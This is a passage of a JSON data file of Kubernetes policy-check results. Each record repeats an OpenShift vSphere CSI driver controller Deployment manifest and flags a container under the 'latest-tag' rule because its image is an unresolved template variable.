    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-provisioner\" is using an invalid container image, \"${PROVISIONER_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8969",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"csi-resizer\" is using an invalid container image, \"${RESIZER_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8970",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"provisioner-kube-rbac-proxy\" is using an invalid container image, \"${KUBE_RBAC_PROXY_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8971",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8203\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: attacher-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9203\n        - --upstream=http://127.0.0.1:8203/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9203\n          name: attacher-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-resizer\n        image: ${RESIZER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --http-endpoint=localhost:8204\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: resizer-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9204\n        - --upstream=http://127.0.0.1:8204/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9204\n          name: resizer-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --probe-timeout=3s\n        - --health-port=10301\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: vsphere-syncer\n        image: ${VMWARE_VSPHERE_SYNCER_IMAGE}\n        args:\n        - --leader-election\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: FULL_SYNC_INTERVAL_MINUTES\n          value: '30'\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - mountPath: /etc/kubernetes/vsphere-csi-config\n          name: vsphere-csi-config-volume\n          readOnly: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: vsphere-csi-config-volume\n        configMap:\n          name: vsphere-csi-config\n      - name: metrics-serving-cert\n        secret:\n          secretName: vmware-vsphere-csi-driver-controller-metrics-serving-cert\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"resizer-kube-rbac-proxy\" is using an invalid container image, \"${KUBE_RBAC_PROXY_IMAGE}\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8972",
    "manifest_path": "data/manifests/the_stack_sample/sample_3389.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vmware-vsphere-csi-driver-controller\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vmware-vsphere-csi-driver-controller\n  template:\n    metadata:\n      labels:\n        app: vmware-vsphere-csi-driver-controller\n    spec:\n      serviceAccountName: vmware-vsphere-csi-driver-controller-sa\n      containers:\n      - name: csi-driver\n        image: ${DRIVER_IMAGE}\n        args:\n        - --fss-name=internal-feature-states.csi.vsphere.vmware.com\n        - --fss-namespace=$(CSI_NAMESPACE)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: X_CSI_MODE\n          value: controller\n        - name: VSPHERE_CSI_CONFIG\n          value: /etc/kubernetes/vsphere-csi-config/cloud.conf\n        - name: LOGGER_LEVEL\n          value: PRODUCTION\n        - name: INCLUSTER_CLIENT_QPS\n          value: '100'\n        - name: INCLUSTER_CLIENT_BURST\n          value: '100'\n        - name: CSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: X_CSI_SERIAL_VOL_ACCESS_TIMEOUT\n          value: 3m\n        - name: X_CSI_SPEC_DISABLE_LEN_CHECK\n          value: 'true'\n        ports:\n        - name: healthz\n          containerPort: 10301\n          protocol: TCP\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        - name: vsphere-csi-config-volume\n          mountPath: /etc/kubernetes/vsphere-csi-config/\n          readOnly: true\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-provisioner\n        image: ${PROVISIONER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - --default-fstype=ext4\n        - --v=${LOG_LEVEL}\n        - --leader-election\n        - --http-endpoint=localhost:8202\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: provisioner-kube-rbac-proxy\n        args:\n        - --secure-listen-address=0.0.0.0:9202\n        - --upstream=http://127.0.0.1:8202/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        - --logtostderr=true\n        image: ${KUBE_RBAC_PROXY_IMAGE}\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9202\n          name: provisioner-m\n          protocol: TCP\n        resources:\n          requests:\n            memory: 20Mi\n            cpu: 10m\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: metrics-serving-cert\n      - name: csi-attacher\n        image: ${ATTACHER_IMAGE}\n        args:\n        - --csi-address=$(ADDRESS)\n        - 